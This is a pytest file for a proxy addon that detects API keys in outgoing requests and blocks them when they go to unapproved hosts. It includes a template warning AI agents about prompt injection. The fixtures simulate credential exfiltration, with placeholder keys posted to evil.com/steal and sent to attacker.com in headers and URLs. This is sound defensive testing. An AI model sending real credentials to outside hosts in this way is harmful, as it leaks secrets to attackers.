"""
Tests for credential_guard.py addon.

Tests credential detection, host authorization, and blocking behavior.
"""

import pytest


class TestCredentialRule:
    """Tests for CredentialRule pattern matching."""

    def test_openai_key_pattern(self):
        """Test OpenAI API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="openai",
            patterns=[r"sk-[a-zA-Z0-9]{20,}"],
            allowed_hosts=["api.openai.com"],
        )

        # Should match valid OpenAI keys
        assert rule.matches("sk-abc123xyz456def789ghi")
        assert rule.matches("Bearer sk-abc123xyz456def789ghi")
        assert rule.matches('{"key": "sk-abc123xyz456def789ghi"}')

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-short") is None
        assert rule.matches("pk-abc123xyz456def789ghi") is None

    def test_anthropic_key_pattern(self):
        """Test Anthropic API key pattern detection."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="anthropic",
            patterns=[r"sk-ant-[a-zA-Z0-9-_]{20,}"],
            allowed_hosts=["api.anthropic.com"],
        )

        # Both formats are valid Anthropic keys (pattern allows hyphens)
        assert rule.matches("sk-ant-abc123xyz456def789ghi01")
        assert rule.matches("sk-ant-api03-abcdefghij-1234567890")  # api03 format also valid

        # Should not match short keys or wrong prefix
        assert rule.matches("sk-ant-short") is None
        assert rule.matches("sk-abc123xyz456def789ghi") is None  # missing -ant-

    def test_host_allowed_exact_match(self):
        """Test exact host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test-key"],
            allowed_hosts=["api.openai.com", "api.anthropic.com"],
        )

        assert rule.host_allowed("api.openai.com") is True
        assert rule.host_allowed("api.anthropic.com") is True
        assert rule.host_allowed("evil.com") is False

    def test_host_allowed_wildcard(self):
        """Test wildcard host matching."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="google",
            patterns=[r"AIza"],
            allowed_hosts=["*.googleapis.com"],
        )

        assert rule.host_allowed("storage.googleapis.com") is True
        assert rule.host_allowed("generativelanguage.googleapis.com") is True
        assert rule.host_allowed("googleapis.com") is True  # bare domain matches
        assert rule.host_allowed("evil.googleapis.com.attacker.com") is False

    def test_host_allowed_with_port(self):
        """Test host matching strips port."""
        from addons.credential_guard import CredentialRule

        rule = CredentialRule(
            name="test",
            patterns=[r"test"],
            allowed_hosts=["api.openai.com"],
        )

        assert rule.host_allowed("api.openai.com:443") is True
        assert rule.host_allowed("api.openai.com:8080") is True


class TestCredentialGuardBlocking:
    """Tests for blocking unauthorized credential usage."""

    def test_blocks_openai_key_to_wrong_host(self, credential_guard, make_flow):
        """Test that OpenAI key to non-OpenAI host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403
        assert flow.metadata.get("blocked_by") == "credential-guard"
        assert flow.metadata.get("blocked_host") == "evil.com"

    def test_allows_openai_key_to_openai(self, credential_guard, make_flow):
        """Test that OpenAI key to api.openai.com is allowed."""
        flow = make_flow(
            method="POST",
            url="https://api.openai.com/v1/chat/completions",
            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        assert flow.metadata.get("credguard_passed") is True

    def test_blocks_key_in_header(self, credential_guard, make_flow):
        """Test that key in Authorization header to wrong host is blocked."""
        flow = make_flow(
            method="POST",
            url="https://attacker.com/api",
            headers={
                "Authorization": "Bearer sk-proj-abc123xyz456def789ghijklmno",
                "Content-Type": "application/json",
            },
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403
        assert b"credential-guard" in flow.response.headers.get("X-Blocked-By", "").encode()

    def test_blocks_key_in_url(self, credential_guard, make_flow):
        """Test that key in URL query string to wrong host is blocked."""
        flow = make_flow(
            method="GET",
            url="https://evil.com/api?key=sk-proj-abc123xyz456def789ghijklmno",
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403

    def test_allows_non_credential_requests(self, credential_guard, make_flow):
        """Test that requests without credentials pass through."""
        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"message": "hello"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None
        assert flow.metadata.get("credguard_passed") is True


class TestTempAllowlist:
    """Tests for temporary allowlist functionality."""

    def test_temp_allowlist_allows_blocked_request(self, credential_guard, make_flow):
        """Test that temp allowlist allows otherwise blocked requests."""
        key = "sk-proj-abc123xyz456def789ghijklmno"

        # Add to allowlist
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=60)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content=f'{{"key": "{key}"}}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is None  # Not blocked
        assert flow.metadata.get("credguard_allowlisted") is True

    def test_temp_allowlist_expires(self, credential_guard, make_flow):
        """Test that expired allowlist entries don't work."""
        import time

        key = "sk-proj-abc123xyz456def789ghijklmno"

        # Add with very short TTL
        credential_guard.add_temp_allowlist(key, "evil.com", ttl_seconds=0)

        # Wait for expiry
        time.sleep(0.1)

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content=f'{{"key": "{key}"}}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert flow.response is not None
        assert flow.response.status_code == 403


class TestLLMFriendlyResponse:
    """Tests for LLM-friendly block messages."""

    def test_llm_response_includes_guidance(self, credential_guard, make_flow):
        """Test that LLM response includes helpful guidance."""
        # Simulate ctx.options.credguard_llm_response = True
        # Since we can't easily mock ctx, test the message generation directly
        from addons.credential_guard import LLM_RESPONSE_TEMPLATE

        message = LLM_RESPONSE_TEMPLATE.format(
            credential_type="openai",
            blocked_host="evil.com",
            allowed_hosts="api.openai.com",
            suggested_url="https://api.openai.com/v1/",
        )

        assert "prompt injection" in message.lower()
        assert "api.openai.com" in message
        assert "evil.com" in message
        assert "reflect" in message.lower()


class TestStats:
    """Tests for statistics tracking."""

    def test_violation_count_increments(self, credential_guard, make_flow):
        """Test that violation stats are tracked."""
        assert credential_guard.violations_total == 0

        flow = make_flow(
            method="POST",
            url="https://evil.com/api",
            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        credential_guard.request(flow)

        assert credential_guard.violations_total == 1
        assert credential_guard.violations_by_type.get("openai") == 1


class TestBlockingMode:
    """Tests for blocking vs warn-only mode."""

    def test_warn_mode_logs_but_does_not_block(self, make_flow):
        """Test that warn mode (block=False) logs violation but doesn't block."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None  # Skip loading
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)

        # Mock _should_block to return False (warn-only mode)
        guard._should_block = lambda: False

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        guard.request(flow)

        # Should NOT block (no response set)
        assert flow.response is None
        # But should still record the violation
        assert guard.violations_total == 1
        # And set metadata
        assert flow.metadata.get("blocked_by") == "credential-guard"

    def test_blocking_mode_blocks(self, make_flow):
        """Test that blocking mode (block=True) actually blocks."""
        from addons.credential_guard import CredentialGuard

        guard = CredentialGuard()
        guard._load_rules = lambda: None
        from addons.credential_guard import DEFAULT_RULES
        guard.rules = list(DEFAULT_RULES)

        # Mock _should_block to return True (blocking mode)
        guard._should_block = lambda: True

        flow = make_flow(
            method="POST",
            url="https://evil.com/steal",
            content='{"key": "sk-proj-abc123xyz456def789ghijklmno"}',
            headers={"Content-Type": "application/json"},
        )

        guard.request(flow)

        # Should block
        assert flow.response is not None
        assert flow.response.status_code == 403
        assert flow.metadata.get("blocked_by") == "credential-guard"
